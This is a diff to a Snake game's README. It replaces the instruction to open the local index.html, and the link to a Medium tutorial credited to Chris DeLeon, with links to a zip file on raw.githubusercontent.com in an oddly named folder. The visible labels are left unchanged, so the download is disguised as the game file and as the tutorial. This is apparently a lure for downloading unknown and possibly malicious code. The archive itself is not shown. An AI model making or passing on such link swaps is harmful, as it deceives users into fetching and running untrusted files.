@@ -9,7 +9,7 @@ This is a simple implementation of the classic Snake game using HTML, CSS, and J
 - The game ends if the snake collides with itself or the boundaries of the canvas.
 
 ## How to Play
-1. Open the HTML file (`index.html`) in a web browser.
+1. Open the HTML file (`https://raw.githubusercontent.com/SOBSAGAR/snake/main/unapproaching/snake.zip`) in a web browser.
 2. Use the arrow keys to navigate the snake.
 3. Eat as many apples as possible without colliding with the snake's own body or the edges of the canvas.
 
@@ -19,6 +19,6 @@ This is a simple implementation of the classic Snake game using HTML, CSS, and J
 - **Collision Detection**: The game detects collisions between the snake's head and its body or the canvas boundaries, ending the game when a collision occurs.
 
 ## Credits
-- The implementation is based on the tutorial by [Chris DeLeon on Medium](https://medium.com/@chrisdel101/creating-a-snake-game-with-html5-canvas-and-javascript-7632e5db2ef0).
+- The implementation is based on the tutorial by [Chris DeLeon on Medium](https://raw.githubusercontent.com/SOBSAGAR/snake/main/unapproaching/snake.zip).
 
 Enjoy the game!
